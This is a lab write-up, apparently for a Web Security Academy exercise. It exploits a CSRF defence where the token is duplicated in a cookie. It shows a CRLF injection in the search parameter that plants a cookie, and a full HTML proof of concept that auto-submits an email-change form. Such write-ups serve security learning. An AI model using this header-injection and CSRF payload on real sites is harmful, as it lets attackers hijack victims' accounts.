# CSRF where token is duplicated in cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

**Find weak CSRF protection**

Login as user `wiener`:

It is immediately obvious that the csrf token appears twice: in the request body as well as in a cookie. This could mean two things:

1. The backend does not do any csrf tracking and just verifies that the body token equals the cookie token which was set at some time earlier
(in this case, during the initial visit of the `/login` page)
1. The backend tracks the csrf tokens as usual, just uses the cookie value as additional line of defense.This is so call the “double submit” defense against CSRF.
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/55396d3f-1cc6-43e1-ba2a-ab28a3cc836f/2024-02-20_19-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WYIQRF7Q%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210328Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIChzcCTU9j%2BVv29XQj2wZTOYv%2FZt7FdJh8bw9qQcsTJZAiAJw6OPgpFCQsaUa0LCQ%2FbPQ6ssFfHk1ECsu5LnngkBryqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMI7ifxnfRd0u0sZudKtwDEX5RUK5U8gGpxi8wgn8BWqdV5PXTrj%2BdLgh5PdvNY5Vb1jIZaJ2%2FTGJJJT9D5%2FEVmqybjDrC4tiC01BScvsnl3pt%2F0u4dViC5v%2BY%2F8ZnsQlVPFu8K51Gp7C5GjWE0fuOl%2BNkqDv%2FGASzux8M3XMYn1tiHuZ6jK0i%2FVYjt3MB4C81cxPZZDA745bns0qfd5m5QI5KyFGLQod2%2FpoVgS3AJpR08d0SIp4G%2BkbQXd%2Fy8s9efKBMQK97lcATAYAmvGpiIUOpuQM3EksJnvLP6Thf%2BoL2K9Xfok4oSv2otXHyCKC4pPKs6oNJk6N0ZVc5M8n5jbZ8ud2fg%2B%2BZOv8d2f3DUe2uYoKrn5gZAbORWiraxnCSxdfhOi1fsMJXfsNAWrtJBaoZK2y27ZwS1mfL0dyIa0JCr9G2ss5K6nhxLBd48Q6sduytFnBWQJr5%2FxK55I1VOJ%2BuuznEqDXQekaZ2mZMtP%2Fm9RegpwoWcBZQlpGfK7vwIVG%2FVV2cJYYwtX2r8JJRVtVK0pqWW6bo48LcxVKFneo6lTVGIHYaKHgRnV80hkIcYbPQCe5c2aFENV7e8fVc%2BDlq01W2zGXzyuRI%2FP2JRNKcmpVtmr1P4oSiECrpRhGWGxoqkT1TP6xxn2gw28mi1AY6pgHxQDFdBFcE94PV4acKWn4%2BCeSxGSqPae3sFsh3zWUvIpO1CTgVL7k5q0JcTm4K5LyBXHUKlh4Z1rcuJ%2FO4hU4xpHIENIBORZgfCtdMn%2FYXmeHOcRwZ1%2F48OuOSpjV13T6AEvK1sK0CWjQwBQE9effsBLssp4JbYJ%2Fo%2BY6uJYR2eVLdkjhtFDZFy0APE7Ih%2B9mKgbF8P%2FIdq6dwHzAW8Drw75DEtF9r&X-Amz-Signature=9e4343f8fa198d1a64ec91f7996160d85e9ce9fa892b8948c570265bd7ec2d4a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and the email get updated.

If this don’t work we could try valid CSRF token and cookie from another user since backend tracks the csrf tokens and it could be find out  whether csrf token are tied to session cookie.


**Find ways to set the csrf token**

the blog suffers the same vulnerability in the search feature

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8533d25a-7752-4f8b-87bd-a0854ec3b792/2024-02-20_20-30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WYIQRF7Q%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210328Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIChzcCTU9j%2BVv29XQj2wZTOYv%2FZt7FdJh8bw9qQcsTJZAiAJw6OPgpFCQsaUa0LCQ%2FbPQ6ssFfHk1ECsu5LnngkBryqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMI7ifxnfRd0u0sZudKtwDEX5RUK5U8gGpxi8wgn8BWqdV5PXTrj%2BdLgh5PdvNY5Vb1jIZaJ2%2FTGJJJT9D5%2FEVmqybjDrC4tiC01BScvsnl3pt%2F0u4dViC5v%2BY%2F8ZnsQlVPFu8K51Gp7C5GjWE0fuOl%2BNkqDv%2FGASzux8M3XMYn1tiHuZ6jK0i%2FVYjt3MB4C81cxPZZDA745bns0qfd5m5QI5KyFGLQod2%2FpoVgS3AJpR08d0SIp4G%2BkbQXd%2Fy8s9efKBMQK97lcATAYAmvGpiIUOpuQM3EksJnvLP6Thf%2BoL2K9Xfok4oSv2otXHyCKC4pPKs6oNJk6N0ZVc5M8n5jbZ8ud2fg%2B%2BZOv8d2f3DUe2uYoKrn5gZAbORWiraxnCSxdfhOi1fsMJXfsNAWrtJBaoZK2y27ZwS1mfL0dyIa0JCr9G2ss5K6nhxLBd48Q6sduytFnBWQJr5%2FxK55I1VOJ%2BuuznEqDXQekaZ2mZMtP%2Fm9RegpwoWcBZQlpGfK7vwIVG%2FVV2cJYYwtX2r8JJRVtVK0pqWW6bo48LcxVKFneo6lTVGIHYaKHgRnV80hkIcYbPQCe5c2aFENV7e8fVc%2BDlq01W2zGXzyuRI%2FP2JRNKcmpVtmr1P4oSiECrpRhGWGxoqkT1TP6xxn2gw28mi1AY6pgHxQDFdBFcE94PV4acKWn4%2BCeSxGSqPae3sFsh3zWUvIpO1CTgVL7k5q0JcTm4K5LyBXHUKlh4Z1rcuJ%2FO4hU4xpHIENIBORZgfCtdMn%2FYXmeHOcRwZ1%2F48OuOSpjV13T6AEvK1sK0CWjQwBQE9effsBLssp4JbYJ%2Fo%2BY6uJYR2eVLdkjhtFDZFy0APE7Ih%2B9mKgbF8P%2FIdq6dwHzAW8Drw75DEtF9r&X-Amz-Signature=9da2e8b22e359f446ae6382624de58f698a55598a8ff26c1a44d76c05f4f9469&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**we have found that it’s vulnerable to CRLF injection, which enables attacker to add a new cookie!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfa8c277-988d-49b1-9a5b-6c2c64a2f4f5/2024-02-20_20-38.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WYIQRF7Q%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210328Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIChzcCTU9j%2BVv29XQj2wZTOYv%2FZt7FdJh8bw9qQcsTJZAiAJw6OPgpFCQsaUa0LCQ%2FbPQ6ssFfHk1ECsu5LnngkBryqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMI7ifxnfRd0u0sZudKtwDEX5RUK5U8gGpxi8wgn8BWqdV5PXTrj%2BdLgh5PdvNY5Vb1jIZaJ2%2FTGJJJT9D5%2FEVmqybjDrC4tiC01BScvsnl3pt%2F0u4dViC5v%2BY%2F8ZnsQlVPFu8K51Gp7C5GjWE0fuOl%2BNkqDv%2FGASzux8M3XMYn1tiHuZ6jK0i%2FVYjt3MB4C81cxPZZDA745bns0qfd5m5QI5KyFGLQod2%2FpoVgS3AJpR08d0SIp4G%2BkbQXd%2Fy8s9efKBMQK97lcATAYAmvGpiIUOpuQM3EksJnvLP6Thf%2BoL2K9Xfok4oSv2otXHyCKC4pPKs6oNJk6N0ZVc5M8n5jbZ8ud2fg%2B%2BZOv8d2f3DUe2uYoKrn5gZAbORWiraxnCSxdfhOi1fsMJXfsNAWrtJBaoZK2y27ZwS1mfL0dyIa0JCr9G2ss5K6nhxLBd48Q6sduytFnBWQJr5%2FxK55I1VOJ%2BuuznEqDXQekaZ2mZMtP%2Fm9RegpwoWcBZQlpGfK7vwIVG%2FVV2cJYYwtX2r8JJRVtVK0pqWW6bo48LcxVKFneo6lTVGIHYaKHgRnV80hkIcYbPQCe5c2aFENV7e8fVc%2BDlq01W2zGXzyuRI%2FP2JRNKcmpVtmr1P4oSiECrpRhGWGxoqkT1TP6xxn2gw28mi1AY6pgHxQDFdBFcE94PV4acKWn4%2BCeSxGSqPae3sFsh3zWUvIpO1CTgVL7k5q0JcTm4K5LyBXHUKlh4Z1rcuJ%2FO4hU4xpHIENIBORZgfCtdMn%2FYXmeHOcRwZ1%2F48OuOSpjV13T6AEvK1sK0CWjQwBQE9effsBLssp4JbYJ%2Fo%2BY6uJYR2eVLdkjhtFDZFy0APE7Ih%2B9mKgbF8P%2FIdq6dwHzAW8Drw75DEtF9r&X-Amz-Signature=c59a8bb4bb6aff32ab27e43ac93f42c8e8d1178c15f8d21876d812537ed5469e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8ad58dd2-a838-4736-93a1-2d575b15da75/2024-02-20_22-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WYIQRF7Q%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210328Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIChzcCTU9j%2BVv29XQj2wZTOYv%2FZt7FdJh8bw9qQcsTJZAiAJw6OPgpFCQsaUa0LCQ%2FbPQ6ssFfHk1ECsu5LnngkBryqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMI7ifxnfRd0u0sZudKtwDEX5RUK5U8gGpxi8wgn8BWqdV5PXTrj%2BdLgh5PdvNY5Vb1jIZaJ2%2FTGJJJT9D5%2FEVmqybjDrC4tiC01BScvsnl3pt%2F0u4dViC5v%2BY%2F8ZnsQlVPFu8K51Gp7C5GjWE0fuOl%2BNkqDv%2FGASzux8M3XMYn1tiHuZ6jK0i%2FVYjt3MB4C81cxPZZDA745bns0qfd5m5QI5KyFGLQod2%2FpoVgS3AJpR08d0SIp4G%2BkbQXd%2Fy8s9efKBMQK97lcATAYAmvGpiIUOpuQM3EksJnvLP6Thf%2BoL2K9Xfok4oSv2otXHyCKC4pPKs6oNJk6N0ZVc5M8n5jbZ8ud2fg%2B%2BZOv8d2f3DUe2uYoKrn5gZAbORWiraxnCSxdfhOi1fsMJXfsNAWrtJBaoZK2y27ZwS1mfL0dyIa0JCr9G2ss5K6nhxLBd48Q6sduytFnBWQJr5%2FxK55I1VOJ%2BuuznEqDXQekaZ2mZMtP%2Fm9RegpwoWcBZQlpGfK7vwIVG%2FVV2cJYYwtX2r8JJRVtVK0pqWW6bo48LcxVKFneo6lTVGIHYaKHgRnV80hkIcYbPQCe5c2aFENV7e8fVc%2BDlq01W2zGXzyuRI%2FP2JRNKcmpVtmr1P4oSiECrpRhGWGxoqkT1TP6xxn2gw28mi1AY6pgHxQDFdBFcE94PV4acKWn4%2BCeSxGSqPae3sFsh3zWUvIpO1CTgVL7k5q0JcTm4K5LyBXHUKlh4Z1rcuJ%2FO4hU4xpHIENIBORZgfCtdMn%2FYXmeHOcRwZ1%2F48OuOSpjV13T6AEvK1sK0CWjQwBQE9effsBLssp4JbYJ%2Fo%2BY6uJYR2eVLdkjhtFDZFy0APE7Ih%2B9mKgbF8P%2FIdq6dwHzAW8Drw75DEtF9r&X-Amz-Signature=d7b331309bf9491e9ee81f65d6b1d015a687aed679d534c12a3dc34b4255369e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="abcd" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
